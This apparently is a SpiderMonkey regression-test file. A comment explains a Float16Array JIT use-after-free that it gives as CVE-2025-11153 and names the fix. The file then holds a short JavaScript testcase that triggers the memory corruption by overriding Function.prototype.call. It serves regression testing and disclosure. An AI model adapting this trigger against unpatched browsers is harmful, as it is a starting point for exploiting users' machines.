// Bug 1987481 — CVE-2025-11153: Memory Corruption in SpiderMonkey GC
// during JIT Compilation with Float16Array + Function.prototype.call Override
//
// Root cause: ArrayBufferViewElementsWithOffset (used by Ion stubs that
// access Float16Array elements) computes the elements pointer once, then
// recursively re-enters the JS function via an overridden
// Function.prototype.call. The recursion forces a nursery minor GC under
// --gc-zeal=15, which moves the typed array's underlying backing.
// Nursery::forwardBufferPointer() walks the JIT frame info to fix up
// pointers, but the cached pointer in the in-flight Ion stack frame is
// not registered as a buffer pointer — the forwarder leaves it dangling.
// The stub then writes into freed nursery memory.
//
// Fix: 4e0b3249af9b — Adjust ArrayBufferViewElementsWithOffset (rhunt,
// 2025-09-11) so the cached pointer is a properly registered buffer
// pointer the forwarder can update.
//
// Bugzilla testcase verbatim.
function crash(value) {
  var array = new Float16Array(10).subarray(1);
  array[0] = Math.f16round(value);
  Function.prototype.call = function () {
    value++;
  };
  crash(array[0], value);
}

for (var i = 0; i < 100; ++i) {
  crash(i);
}
